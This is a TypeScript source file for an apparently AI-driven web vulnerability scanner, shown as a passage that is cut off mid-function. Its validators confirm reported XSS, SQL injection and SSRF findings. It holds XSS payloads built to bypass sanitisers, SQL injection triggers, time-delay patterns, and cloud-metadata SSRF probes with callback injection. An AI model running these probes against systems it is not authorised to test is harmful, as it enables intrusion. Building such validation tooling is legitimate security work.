/**
 * Finding Validation Engine
 *
 * Separates finding exploration (probabilistic, LLM-driven) from finding
 * verification (deterministic, code-driven). This is the single most important
 * quality differentiator — zero false positives.
 *
 * Each vulnerability type has a specialized validator that confirms findings
 * through independent, repeatable tests.
 */

import type { ReactFinding } from '../engine/react_loop';
import type { HeadlessBrowser } from './headless_browser';
import { OOBServer } from './oob_server';
import type { Cookie } from '../http/request_engine';
// Web Crypto API — available in all modern browsers and Node.js 19+
// No Node.js crypto import needed; globalThis.crypto works everywhere.

// ─── Shared Browser Instance ────────────────────────────────────────────────

/** Lazy-initialized browser for validators that need Playwright.
 *  Playwright is a Node.js-only library, so we use dynamic import to avoid
 *  pulling it into the Vite/browser bundle at module load time. */
let sharedBrowser: HeadlessBrowser | null = null;

async function getSharedBrowser(): Promise<HeadlessBrowser> {
  if (!sharedBrowser) {
    const { HeadlessBrowser: HB } = await import('./headless_browser');
    sharedBrowser = new HB({ headless: true });
  }
  return sharedBrowser;
}

/** Call this when the hunt session ends to release browser resources */
export async function shutdownValidationBrowser(): Promise<void> {
  if (sharedBrowser) {
    await sharedBrowser.close();
    sharedBrowser = null;
  }
}

/** OOB server reference — set by the orchestrator when a hunt starts */
let validatorOobServer: OOBServer | undefined;

export function setValidatorOOBServer(server: OOBServer | undefined): void {
  validatorOobServer = server;
}

// ─── Types ───────────────────────────────────────────────────────────────────

export interface ValidationResult {
  findingId: string;
  confirmed: boolean;
  evidence: ValidationEvidence[];
  reproductionSteps: string[];
  confidence: number;
  validatorUsed: string;
  validationTime: number;
  error?: string;
}

export interface ValidationEvidence {
  type: 'http_request' | 'http_response' | 'screenshot' | 'callback' | 'timing' | 'diff' | 'script_output';
  description: string;
  data: string;
  timestamp: number;
}

export interface ValidatorConfig {
  /** Callback to execute commands for validation */
  executeCommand: (command: string, target: string) => Promise<{
    success: boolean;
    stdout: string;
    stderr: string;
    exitCode: number;
    executionTimeMs: number;
  }>;
  /** Timeout for validation attempts in ms */
  timeout?: number;
  /** interactsh server URL for OOB testing */
  interactshServer?: string;
  /**
   * Auth headers attached to every curl invocation the validator builds via
   * `buildCurlArgv`. Populated from the active hunt's AuthenticatedSession
   * when available so validators can reach auth-gated endpoints (the 2026-04-23
   * Pug SSTI on POST `/api/BasketItems` was the motivating case — the GET
   * probe hit 401 without this). Keep these as the resolved header map; the
   * validator never sees the SessionManager itself.
   */
  authHeaders?: Record<string, string>;
  /** Auth cookies attached to every curl invocation the validator builds. */
  authCookies?: Cookie[];
  /**
   * Secondary identity for differential validators (idor/bola).
   * When the active hunt has two auth sessions configured (victim + attacker),
   * validators can re-run the probe as the secondary identity and compare.
   * If the secondary identity's response contains the primary's data, that's
   * definitionally a broken-access finding — regardless of status code.
   */
  secondaryAuthHeaders?: Record<string, string>;
  secondaryAuthCookies?: Cookie[];
  /** Human-readable label for the primary/secondary identities so the
   *  validator can annotate evidence without guessing. */
  primaryAuthLabel?: string;
  secondaryAuthLabel?: string;
}

/**
 * Build a null-joined curl argv string for `ValidatorConfig.executeCommand`.
 * Matches the convention every existing validator uses — the PTY layer on the
 * Rust side splits on `\x00` so argv stays intact (no shell interpolation).
 *
 * Auth headers/cookies from `ValidatorConfig` are attached automatically when
 * passed, so validators that call `buildCurlArgv` inherit the active hunt's
 * credentials without each one re-implementing the plumbing.
 */
export function buildCurlArgv(opts: {
  url: string;
  method?: 'GET' | 'POST' | 'PUT' | 'DELETE' | 'PATCH';
  body?: string;
  contentType?: string;
  headers?: Record<string, string>;
  cookies?: Cookie[];
  authHeaders?: Record<string, string>;
  authCookies?: Cookie[];
  dumpHeaders?: boolean;
  followRedirects?: boolean;
  maxRedirects?: number;
  /** Value passed to `curl -w` — e.g. `%{time_total}` for blind-time SQLi. */
  writeOut?: string;
  /** Send body to /dev/null instead of stdout. Used with `writeOut` for timing probes. */
  discardBody?: boolean;
}): string {
  const argv: string[] = ['curl', '-s'];
  if (opts.dumpHeaders) argv.push('-D', '-');
  argv.push('-o', opts.discardBody ? '/dev/null' : '-');
  if (opts.writeOut) argv.push('-w', opts.writeOut);
  if (opts.followRedirects) {
    argv.push('-L', '--max-redirs', String(opts.maxRedirects ?? 5));
  }

  const method = opts.method ?? 'GET';
  if (method !== 'GET') argv.push('-X', method);

  // Auth headers first, then explicit headers (explicit wins — caller can
  // override e.g. Authorization if they need to).
  const allHeaders: Record<string, string> = {
    ...(opts.authHeaders ?? {}),
    ...(opts.headers ?? {}),
  };

  // Cookies merge with the same precedence: auth cookies first, then explicit.
  const cookieParts: string[] = [];
  for (const c of opts.authCookies ?? []) cookieParts.push(`${c.name}=${c.value}`);
  for (const c of opts.cookies ?? []) cookieParts.push(`${c.name}=${c.value}`);
  if (cookieParts.length > 0) argv.push('-b', cookieParts.join('; '));

  if (opts.body !== undefined) {
    const ct = opts.contentType ?? (opts.body.trim().startsWith('{') ? 'application/json' : 'application/x-www-form-urlencoded');
    if (!allHeaders['Content-Type'] && !allHeaders['content-type']) {
      allHeaders['Content-Type'] = ct;
    }
    argv.push('--data-raw', opts.body);
  }

  for (const [k, v] of Object.entries(allHeaders)) {
    argv.push('-H', `${k}: ${v}`);
  }

  argv.push(opts.url);
  return argv.join('\x00');
}

/** Base interface for all validators */
interface Validator {
  vulnType: string;
  validate(finding: ReactFinding, config: ValidatorConfig): Promise<ValidationResult>;
}

// ─── Validator Registry ──────────────────────────────────────────────────────

const validators: Map<string, Validator> = new Map();

function registerValidator(validator: Validator): void {
  validators.set(validator.vulnType, validator);
}

/** Validate a finding using the appropriate validator */
export async function validateFinding(
  finding: ReactFinding,
  config: ValidatorConfig
): Promise<ValidationResult> {
  const startTime = Date.now();

  // Find the right validator
  const validator = validators.get(finding.vulnerabilityType);
  if (!validator) {
    return {
      findingId: finding.id,
      confirmed: false,
      evidence: [],
      reproductionSteps: [],
      confidence: finding.confidence,
      validatorUsed: 'none',
      validationTime: Date.now() - startTime,
      error: `No validator available for type: ${finding.vulnerabilityType}`,
    };
  }

  try {
    return await validator.validate(finding, config);
  } catch (error) {
    return {
      findingId: finding.id,
      confirmed: false,
      evidence: [],
      reproductionSteps: [],
      confidence: Math.max(0, finding.confidence - 30),
      validatorUsed: validator.vulnType,
      validationTime: Date.now() - startTime,
      error: error instanceof Error ? error.message : String(error),
    };
  }
}

/** Validate multiple findings in parallel */
export async function validateFindings(
  findings: ReactFinding[],
  config: ValidatorConfig
): Promise<ValidationResult[]> {
  return Promise.all(findings.map(f => validateFinding(f, config)));
}

// ─── Helpers ────────────────────────────────────────────────────────────────

/**
 * XSS payload palette tried in sequence by the reflected/DOM validators.
 *
 * The 2026-04-23 Juice Shop hunt made it concrete: Angular (and any framework
 * with default HTML sanitization on innerHTML-bound templates) will strip a
 * plain `<script>alert(...)</script>`, so every single XSS finding came back
 * "could not be verified" even when the agents had a working exploit. The
 * fix isn't smarter detection — it's trying multiple *real* bypass shapes
 * and stopping at the first one that fires the marker.
 *
 * `detectionHook` picks the sink the validator listens on: `alert` for
 * reflected XSS (HeadlessBrowser.validateXSS watches dialogs) and
 * `console.log` for DOM XSS (HeadlessBrowser.navigateAndAnalyze watches
 * console).
 */
export function buildXssPayloadVariants(
  marker: string,
  detectionHook: 'alert' | 'console.log',
): Array<{ label: string; html: string }> {
  const trigger = detectionHook === 'alert'
    ? `alert('${marker}')`
    : `console.log('${marker}')`;
  return [
    { label: 'script-tag', html: `<script>${trigger}</script>` },
    { label: 'iframe-javascript', html: `<iframe src="javascript:${trigger}"></iframe>` },
    { label: 'svg-onload', html: `<svg onload="${trigger}">` },
    { label: 'img-onerror', html: `<img src=x onerror="${trigger}">` },
  ];
}

/**
 * Inject a marker payload into a URL by replacing known XSS payload patterns
 * or appending to the last query parameter value.
 */
function injectMarkerPayload(url: string, payload: string): string {
  // Try to replace existing XSS payload patterns in query params
  const xssPatterns = [
    /<script[^>]*>.*?<\/script>/gi,
    /<img[^>]*onerror[^>]*>/gi,
    /<svg[^>]*onload[^>]*>/gi,
    /javascript:[^&]*/gi,
    /alert\([^)]*\)/gi,
  ];

  for (const pattern of xssPatterns) {
    if (pattern.test(url)) {
      return url.replace(pattern, payload);
    }
  }

  // If no pattern matched, append payload to the last query parameter
  if (url.includes('?')) {
    const qIdx = url.lastIndexOf('=');
    if (qIdx !== -1) {
      return url.substring(0, qIdx + 1) + encodeURIComponent(payload);
    }
    return `${url}&xss=${encodeURIComponent(payload)}`;
  }
  return `${url}?xss=${encodeURIComponent(payload)}`;
}

// ─── XSS Validators (Playwright-based) ──────────────────────────────────────

registerValidator({
  vulnType: 'xss_reflected',
  async validate(finding): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];

    // Unique marker — false-positive guard (only *our* payload firing counts).
    const marker = `HUNTRESS_XSS_${globalThis.crypto.randomUUID().slice(0, 8)}`;
    const targetUrl = finding.target;

    const browser = await getSharedBrowser();
    const oobChecker = validatorOobServer
      ? () => validatorOobServer!.getTriggeredCallbacks().some(c =>
          c.injectionPoint.vulnerabilityType === 'xss' &&
          c.injectionPoint.target === finding.target
        )
      : undefined;

    steps.push(`Generated unique marker: ${marker}`);

    // Try each payload variant in sequence. First to fire the marker wins —
    // dialog/console/OOB evidence from every attempt is aggregated regardless.
    const variants = buildXssPayloadVariants(marker, 'alert');
    let confirmed = false;
    let confidence = 0;
    let firingVariant: string | null = null;

    for (const variant of variants) {
      const craftedUrl = injectMarkerPayload(targetUrl, variant.html);
      steps.push(`Trying ${variant.label}: ${variant.html}`);

      const attempt = await browser.validateXSS(craftedUrl, marker, oobChecker);
      evidence.push(...attempt.evidence);
      confidence = Math.max(confidence, attempt.confidence);

      if (attempt.confirmed) {
        confirmed = true;
        firingVariant = variant.label;
        steps.push(`✓ CONFIRMED via ${variant.label} payload`);
        break;
      }
    }

    if (!confirmed) {
      steps.push(`No payload variant fired (${variants.length} attempted) — XSS not confirmed`);
    }

    confidence = Math.min(100, confidence);
    steps.push(`Confirmed: ${confirmed} (confidence: ${confidence}%, firing variant: ${firingVariant ?? 'none'})`);

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: 'xss_reflected_playwright',
      validationTime: Date.now() - startTime,
    };
  },
});

registerValidator({
  vulnType: 'xss_stored',
  async validate(finding): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];

    const marker = `HUNTRESS_XSS_${globalThis.crypto.randomUUID().slice(0, 8)}`;
    const renderUrl = finding.target;
    const browser = await getSharedBrowser();

    steps.push(`Navigating to rendering page as victim: ${renderUrl}`);
    steps.push(`Checking for stored XSS marker: ${marker}`);

    // Step 1: Plain navigation — does the agent's previously-injected payload
    // still fire at the victim context? This is the primary stored-XSS signal.
    const browseResult = await browser.navigateAndAnalyze(renderUrl);
    let confidence = 0;
    let firingVariant: string | null = null;
    let confirmed = false;

    if (browseResult.dialogDetected) {
      confirmed = true;
      confidence = 70;
      firingVariant = 'agent-stored';
      evidence.push({
        type: 'script_output',
        description: `Stored XSS dialog triggered on page load: "${browseResult.dialogMessage ?? 'alert'}"`,
        data: `URL: ${renderUrl}\nDialog: ${browseResult.dialogMessage ?? 'unknown'}`,
        timestamp: Date.now(),
      });
      steps.push(`✓ Dialog fired on page load — agent's stored payload is still live`);
    } else {
      steps.push('No dialog on plain navigation — trying re-injection variants');
    }

    // Step 2: If the stored payload didn't fire (agent context cleared,
    // test fixtures reset between hunts, etc.), fall back to the reflected
    // multi-payload sweep on the rendering URL. Many "stored" findings on
    // SPAs are really reflected-via-hash — this catches both.
    if (!confirmed) {
      const variants = buildXssPayloadVariants(marker, 'alert');
      for (const variant of variants) {
        const craftedUrl = injectMarkerPayload(renderUrl, variant.html);
        steps.push(`Trying ${variant.label} re-injection: ${variant.html}`);

        const attempt = await browser.validateXSS(craftedUrl, marker);
        evidence.push(...attempt.evidence);
        confidence = Math.max(confidence, attempt.confidence);

        if (attempt.confirmed) {
          confirmed = true;
          firingVariant = variant.label;
          steps.push(`✓ CONFIRMED via ${variant.label} re-injection`);
          break;
        }
      }

      if (!confirmed) steps.push('No variant fired — stored XSS not confirmed at victim context');
    }

    confidence = Math.min(100, confidence);
    steps.push(`Confirmed: ${confirmed} (confidence: ${confidence}%, firing variant: ${firingVariant ?? 'none'})`);

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: 'xss_stored_playwright',
      validationTime: Date.now() - startTime,
    };
  },
});

registerValidator({
  vulnType: 'xss_dom',
  async validate(finding): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];

    const targetUrl = finding.target;
    steps.push(`Analyzing DOM XSS sinks/sources at: ${targetUrl}`);

    // Use page.evaluate() to find live sink/source patterns
    const browser = await getSharedBrowser();
    const analysis = await browser.analyzeDOMXSS(targetUrl);

    evidence.push(...analysis.evidence);

    let confidence = finding.confidence;

    if (analysis.sinks.length > 0) {
      confidence = Math.min(100, confidence + 15);
      steps.push(`Sinks found: ${analysis.sinks.join(', ')}`);
    } else {
      steps.push('No DOM XSS sinks detected');
    }

    if (analysis.sources.length > 0) {
      confidence = Math.min(100, confidence + 15);
      steps.push(`Sources found: ${analysis.sources.join(', ')}`);
    } else {
      steps.push('No DOM XSS sources detected');
    }

    if (analysis.hasDangerousFlow) {
      confidence = Math.min(100, confidence + 20);
      steps.push('DANGEROUS: source→sink flow detected');
    }

    // Navigate with marker payloads and watch the console. Angular-style
    // hash routing (Juice Shop `#/search?q=...`) needs the payload in the
    // query-slot of the hash — `injectMarkerPayload` handles that correctly
    // because its last-`=` search picks the hash-scoped param.
    const marker = `HUNTRESS_DOM_${globalThis.crypto.randomUUID().slice(0, 8)}`;
    const variants = buildXssPayloadVariants(marker, 'console.log');
    let markerInConsole = false;
    let firingVariant: string | null = null;

    for (const variant of variants) {
      const attemptUrl = injectMarkerPayload(targetUrl, variant.html);
      steps.push(`Trying ${variant.label}: ${variant.html}`);
      const navResult = await browser.navigateAndAnalyze(attemptUrl);

      if (navResult.consoleLogs.some(l => l.text.includes(marker))) {
        markerInConsole = true;
        firingVariant = variant.label;
        confidence = Math.min(100, confidence + 30);
        evidence.push({
          type: 'script_output',
          description: `DOM XSS confirmed: ${variant.label} payload executed`,
          data: `Marker "${marker}" appeared in console after navigating to: ${attemptUrl}`,
          timestamp: Date.now(),
        });
        steps.push(`✓ DOM XSS EXECUTED via ${variant.label}`);
        break;
      }
    }

    if (!markerInConsole) {
      steps.push(`No payload variant fired the marker (${variants.length} attempted)`);
    }

    const confirmed = confidence >= 60 && (analysis.hasDangerousFlow || markerInConsole);
    if (confirmed && firingVariant) {
      steps.push(`Firing variant: ${firingVariant}`);
    }

    steps.push(`Confirmed: ${confirmed} (confidence: ${confidence}%)`);

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: 'xss_dom_playwright',
      validationTime: Date.now() - startTime,
    };
  },
});

// ─── SQLi Validators ─────────────────────────────────────────────────────────

/** DB-engine error fingerprints shared by the SQLi validators. */
const SQL_DB_ERRORS: Record<string, RegExp[]> = {
  mysql: [/SQL syntax.*MySQL/i, /Warning.*mysql_/i, /MySQLSyntaxErrorException/i, /You have an error in your SQL syntax/i],
  postgresql: [/ERROR:\s+syntax error/i, /pg_query/i, /PSQLException/i, /PostgreSQL.*ERROR/i],
  mssql: [/Microsoft.*ODBC/i, /SQLServer/i, /Unclosed quotation mark/i, /SQL Server.*\[SQL/i],
  oracle: [/ORA-\d{5}/i, /Oracle.*Driver/i, /quoted string not properly terminated/i],
  sqlite: [/SQLITE_ERROR/i, /SQLite3::query/i, /near ".*": syntax error/i, /unrecognized token/i],
};

const SQL_ALL_ERROR_PATTERNS = Object.values(SQL_DB_ERRORS).flat();

/** Canonical SQL error-trigger payload tried in POST body sweeps. A bare
 *  single quote is the most portable trigger — breaks the string context in
 *  every engine that would be vulnerable. */
const SQL_ERROR_TRIGGERS = ["'", '")', "'))", "' OR '1'='1"];

/** Body field names tried for POST SQLi sweeps. Separate list from SSTI's —
 *  SQL injection tends to live in id/search/filter/sort/user fields. */
const SQLI_BODY_FIELDS = [
  'id', 'user_id', 'username', 'email', 'search', 'q', 'query',
  'filter', 'sort', 'order', 'name',
] as const;

function detectSqlError(stdout: string): string | null {
  for (const [db, patterns] of Object.entries(SQL_DB_ERRORS)) {
    if (patterns.some(p => p.test(stdout))) return db;
  }
  return null;
}

registerValidator({
  vulnType: 'sqli_error',
  async validate(finding, config): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];

    let confirmed = false;
    let detectedDb: string | null = null;
    let injectionSite: string | null = null;
    let confidence = finding.confidence;

    // Step 1: Re-send the original error-triggering URL (GET query path).
    const originalResult = await config.executeCommand(
      buildCurlArgv({ url: finding.target, authHeaders: config.authHeaders, authCookies: config.authCookies }),
      finding.target
    );

    detectedDb = detectSqlError(originalResult.stdout);

    evidence.push({
      type: 'http_response',
      description: `Response with ${detectedDb ? detectedDb + ' error' : 'potential error'}`,
      data: originalResult.stdout.substring(0, 5000),
      timestamp: Date.now(),
    });

    steps.push(`Sent error-triggering payload to: ${finding.target}`);
    steps.push(`Database error detected in GET response: ${detectedDb || 'none'}`);

    // Step 2: Clean-URL negative control — if a stripped version of the
    // original URL ALSO produces a DB error, the error is page-default and
    // not caused by our payload. Discard.
    const cleanUrl = finding.target.replace(/['"\\].*$/, '');
    if (cleanUrl !== finding.target) {
      const cleanResult = await config.executeCommand(
        buildCurlArgv({ url: cleanUrl, authHeaders: config.authHeaders, authCookies: config.authCookies }),
        finding.target
      );
      const cleanErr = detectSqlError(cleanResult.stdout);
      if (cleanErr && detectedDb) {
        steps.push(`FALSE POSITIVE: clean URL also returns ${cleanErr} error — discarding GET match`);
        detectedDb = null;
      } else {
        steps.push(`Clean URL does not return DB error (${detectedDb ? 'confirmed' : 'nothing to confirm'})`);
      }
    }

    if (detectedDb) {
      confirmed = true;
      injectionSite = 'GET query';
      confidence = Math.min(100, confidence + 25);
    }

    // Step 3: POST body sweep for API-looking targets (same heuristic as
    // SSTI). The 2026-04-23 hunt pattern: agent finds SQLi in a body param,
    // but the finding target is the bare endpoint URL with no query string,
    // so GET-only probes never trigger.
    const looksLikeApi = /\/(api|rest|v\d+)\//i.test(finding.target)
      || /POST|PUT|PATCH/i.test(finding.description ?? '')
      || /body|field|parameter/i.test(finding.description ?? '');

    if (!confirmed && looksLikeApi) {
      steps.push(`--- POST body sweep over ${SQLI_BODY_FIELDS.length} fields × ${SQL_ERROR_TRIGGERS.length} triggers ---`);

      outer:
      for (const field of SQLI_BODY_FIELDS) {
        for (const trigger of SQL_ERROR_TRIGGERS) {
          const probeResult = await config.executeCommand(
            buildCurlArgv({
              url: finding.target, method: 'POST',
              body: JSON.stringify({ [field]: trigger }),
              contentType: 'application/json',
              authHeaders: config.authHeaders, authCookies: config.authCookies,
            }),
            finding.target
          );
          const bodyErr = detectSqlError(probeResult.stdout);
          if (!bodyErr) continue;

          // Negative control: clean value shouldn't error.
          const cleanProbeResult = await config.executeCommand(
            buildCurlArgv({
              url: finding.target, method: 'POST',
              body: JSON.stringify({ [field]: 'clean' }),
              contentType: 'application/json',
              authHeaders: config.authHeaders, authCookies: config.authCookies,
            }),
            finding.target
          );
          if (detectSqlError(cleanProbeResult.stdout)) {
            steps.push(`  FALSE POSITIVE: clean value on "${field}" also errors — skip`);
            continue;
          }

          detectedDb = bodyErr;
          injectionSite = `POST body field "${field}" trigger ${JSON.stringify(trigger)}`;
          confirmed = true;
          confidence = Math.min(100, confidence + 30);
          evidence.push({
            type: 'http_response',
            description: `${injectionSite}: ${bodyErr} error observed`,
            data: probeResult.stdout.substring(0, 5000),
            timestamp: Date.now(),
          });
          steps.push(`  ✓ CONFIRMED: ${injectionSite} → ${bodyErr}`);
          break outer;
        }
      }

      if (!confirmed) steps.push('POST body sweep exhausted — no SQLi confirmed');
    }

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: injectionSite
        ? `sqli_error (${injectionSite}, ${detectedDb})`
        : 'sqli_error',
      validationTime: Date.now() - startTime,
    };
  },
});

/** Strip known time-based SQL payload patterns from a URL so we can hit the
 *  same endpoint without the SLEEP/BENCHMARK/pg_sleep/WAITFOR fragment.
 *  Used by sqli_blind_time to derive a baseline URL distinct from the
 *  payload URL — without this, the baseline and delay probes hit the same
 *  URL and the timing diff is always zero (the shipping-day bug this
 *  function was written to fix). */
export function deriveSqlBaselineUrl(target: string): string {
  let clean = target;
  const payloadPatterns: RegExp[] = [
    /SLEEP\s*\(\s*\d+\s*\)/gi,
    /BENCHMARK\s*\([^)]*\)/gi,
    /pg_sleep\s*\(\s*\d+\s*\)/gi,
    /WAITFOR\s+DELAY[^&'"]*'[^']*'/gi,
    /dbms_pipe\.receive_message\s*\([^)]*\)/gi,
  ];
  for (const p of payloadPatterns) clean = clean.replace(p, '1');
  // URL-encoded variants.
  clean = clean
    .replace(/SLEEP%28\d+%29/gi, '1')
    .replace(/pg_sleep%28\d+%29/gi, '1');
  // If nothing changed, null out the last query-param value — that still
  // hits the same endpoint but removes whatever payload is there.
  if (clean === target) {
    if (clean.includes('?') && clean.includes('=')) {
      const lastEq = clean.lastIndexOf('=');
      clean = clean.substring(0, lastEq + 1) + '1';
    }
  }
  return clean;
}

registerValidator({
  vulnType: 'sqli_blind_time',
  async validate(finding, config): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];

    const baselineUrl = deriveSqlBaselineUrl(finding.target);
    const baselineDiffers = baselineUrl !== finding.target;

    if (!baselineDiffers) {
      steps.push('WARN: could not derive a distinct baseline URL (no query parameter or payload pattern to strip) — timing test is unreliable');
    }

    // Step 1: Baseline timing — clean URL with no SQL payload.
    const baseline = await config.executeCommand(
      buildCurlArgv({
        url: baselineUrl, discardBody: true, writeOut: '%{time_total}',
        authHeaders: config.authHeaders, authCookies: config.authCookies,
      }),
      finding.target
    );
    const baselineTime = parseFloat(baseline.stdout) * 1000;
    steps.push(`Baseline (${baselineUrl}) response time: ${baselineTime.toFixed(0)}ms`);

    // Step 2: Delay probe — the original payload URL.
    const delayResult = await config.executeCommand(
      buildCurlArgv({
        url: finding.target, discardBody: true, writeOut: '%{time_total}',
        authHeaders: config.authHeaders, authCookies: config.authCookies,
      }),
      finding.target
    );
    const delayTime = parseFloat(delayResult.stdout) * 1000;
    steps.push(`Delay payload (${finding.target}) response time: ${delayTime.toFixed(0)}ms`);

    evidence.push({
      type: 'timing',
      description: `Baseline: ${baselineTime.toFixed(0)}ms, With delay: ${delayTime.toFixed(0)}ms`,
      data: `Baseline URL: ${baselineUrl}\nPayload URL: ${finding.target}\nDifference: ${(delayTime - baselineTime).toFixed(0)}ms`,
      timestamp: Date.now(),
    });

    // Without a distinct baseline the timing diff is meaningless — don't
    // confirm on noise.
    const timeDiff = delayTime - baselineTime;
    let confirmed = false;
    let confidence = finding.confidence;

    if (!baselineDiffers) {
      confidence = Math.max(0, confidence - 30);
      steps.push('Not confirmed: no baseline URL to compare against');
    } else if (timeDiff > 5000) {
      confirmed = true;
      confidence = Math.min(100, confidence + 30);
    } else if (timeDiff > 3000) {
      confirmed = true;
      confidence = Math.min(100, confidence + 15);
    } else {
      confidence = Math.max(0, confidence - 20);
    }

    steps.push(`Time difference: ${timeDiff.toFixed(0)}ms (threshold: 3000ms, confirmed: ${confirmed})`);

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: 'sqli_blind_time',
      validationTime: Date.now() - startTime,
    };
  },
});

/** Substitute a URL into the target's query-parameter value slot. Preserves
 *  the same host/path so the vulnerability condition stays triggered; only
 *  the value-part (what the server-side fetcher will try to retrieve) gets
 *  replaced with our fresh OOB URL. */
function substituteUrlValue(target: string, replacementUrl: string): string {
  if (target.includes('?') && target.includes('=')) {
    const lastEq = target.lastIndexOf('=');
    return target.substring(0, lastEq + 1) + encodeURIComponent(replacementUrl);
  }
  // No query param to substitute into — append one for the fetcher.
  return `${target}${target.includes('?') ? '&' : '?'}url=${encodeURIComponent(replacementUrl)}`;
}

/** Sleep for `ms` milliseconds. Used while waiting for async OOB callbacks
 *  after sending a probe. */
function sleep(ms: number): Promise<void> {
  return new Promise(r => setTimeout(r, ms));
}

// ─── SSRF Validator ─────────────────────────────────────────────────────────
// Three confirmation paths, any of which stands on its own:
//   1. Cloud-metadata indicators in the response body (AWS, GCP, localhost refs).
//   2. Active OOB callback — we inject a freshly-allocated interactsh URL
//      into the target, send the probe, and wait for the server-side fetch
//      to hit our OOB host. This is the strongest possible proof.
//   3. Passive OOB correlation — fall back to any callback the agent's
//      exploration phase already triggered against this target.

registerValidator({
  vulnType: 'ssrf',
  async validate(finding, config): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];

    // Step 1: Cloud-metadata indicator scan on the agent's original target.
    const result = await config.executeCommand(
      buildCurlArgv({ url: finding.target, authHeaders: config.authHeaders, authCookies: config.authCookies }),
      finding.target
    );

    const metadataIndicators = [
      /ami-[a-f0-9]+/i,
      /iam.*role/i,
      /instance-id/i,
      /access.?key/i,
      /secret.?key/i,
      /127\.0\.0\.1/,
      /169\.254\.169\.254/,
      /metadata\.google/,
      /computeMetadata/,
      /latest\/meta-data/,
    ];
    const matchedIndicators = metadataIndicators.filter(p => p.test(result.stdout));

    evidence.push({
      type: 'http_response',
      description: 'Response from SSRF probe',
      data: result.stdout.substring(0, 5000),
      timestamp: Date.now(),
    });

    const responseConfirmed = matchedIndicators.length >= 2;
    steps.push(`Sent SSRF probe to: ${finding.target}`);
    steps.push(`Cloud-metadata indicators matched: ${matchedIndicators.length}`);

    // Step 2: Active OOB injection. Allocate a fresh callback URL, jam it
    // into the target's URL-param slot, send the probe, and wait ~3s for
    // the server-side fetch to land on our OOB host. The callback id makes
    // this deterministic: no false-positives from the agent's prior probes.
    let activeOobConfirmed = false;
    if (validatorOobServer) {
      const callback = validatorOobServer.generateCallbackUrl({
        vulnerabilityType: 'ssrf',
        target: finding.target,
        parameter: 'url',
        agentId: finding.agentId ?? 'validator',
      });
      const oobUrl = validatorOobServer.getHttpUrl(callback);
      const probeUrl = substituteUrlValue(finding.target, oobUrl);

      steps.push(`Active OOB probe → ${probeUrl}`);
      await config.executeCommand(
        buildCurlArgv({ url: probeUrl, authHeaders: config.authHeaders, authCookies: config.authCookies }),
        finding.target
      );

      // Server-side fetch may race our await — give the OOB poller ~3s.
      await sleep(3000);

      if (validatorOobServer.isTriggered(callback.id)) {
        activeOobConfirmed = true;
        const cb = validatorOobServer.getTriggeredCallbacks().find(c => c.id === callback.id);
        evidence.push({
          type: 'callback',
          description: `Active OOB callback received from ${cb?.interaction?.sourceIp ?? 'unknown'} (${cb?.interaction?.protocol ?? 'unknown'})`,
          data: `Callback ID: ${callback.id}\nOOB URL: ${oobUrl}\nTriggered at: ${new Date(cb?.triggeredAt ?? 0).toISOString()}`,
          timestamp: Date.now(),
        });
        steps.push(`✓ Active OOB CONFIRMED — server-side fetch hit our OOB host`);
      } else {
        steps.push('Active OOB: no callback within 3s window');
      }
    } else {
      steps.push('OOB server not available — active injection skipped');
    }

    // Step 3: Passive OOB correlation — fall back to any callback from the
    // agent's exploration phase that matches this target.
    let passiveOobConfirmed = false;
    if (!activeOobConfirmed && validatorOobServer) {
      const priorCallbacks = validatorOobServer.getTriggeredCallbacks().filter(c =>
        c.injectionPoint.vulnerabilityType === 'ssrf'
        && c.injectionPoint.target === finding.target
      );
      if (priorCallbacks.length > 0) {
        passiveOobConfirmed = true;
        const cb = priorCallbacks[0];
        evidence.push({
          type: 'callback',
          description: `Passive OOB callback from agent phase: ${cb.interaction?.protocol ?? 'unknown'} from ${cb.interaction?.sourceIp ?? 'unknown'}`,
          data: `Callback ID: ${cb.id}\nTriggered at: ${new Date(cb.triggeredAt ?? 0).toISOString()}`,
          timestamp: Date.now(),
        });
        steps.push(`Passive OOB callback from agent phase — confirmed`);
      } else {
        steps.push('Passive OOB: no prior callbacks on this target');
      }
    }

    const oobConfirmed = activeOobConfirmed || passiveOobConfirmed;
    const confirmed = oobConfirmed
      || (responseConfirmed && matchedIndicators.length >= 4);

    let confidence = finding.confidence;
    if (responseConfirmed) confidence = Math.min(100, confidence + 20);
    if (activeOobConfirmed) confidence = Math.min(100, confidence + 40);
    else if (passiveOobConfirmed) confidence = Math.min(100, confidence + 30);
    if (responseConfirmed && oobConfirmed) confidence = Math.min(100, confidence + 10);

    steps.push(`Confirmation: response=${responseConfirmed}, active_oob=${activeOobConfirmed}, passive_oob=${passiveOobConfirmed}`);

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: activeOobConfirmed
        ? 'ssrf_active_oob'
        : passiveOobConfirmed
          ? 'ssrf_passive_oob'
          : 'ssrf_response_indicators',
      validationTime: Date.now() - startTime,
    };
  },
});

// ─── IDOR Validator ──────────────────────────────────────────────────────────

/** Validator logic shared by idor and bola — a broken-access check that
 *  re-sends the finding's target as the primary identity (status-code check)
 *  and, when a secondary identity is configured, as the attacker identity
 *  for a data-ownership differential. Same-body-different-identity is the
 *  gold-standard broken-access signal. */
async function validateBrokenAccess(
  finding: ReactFinding,
  config: ValidatorConfig,
  validatorLabel: 'idor' | 'bola',
): Promise<ValidationResult> {
  const startTime = Date.now();
  const evidence: ValidationEvidence[] = [];
  const steps: string[] = [];

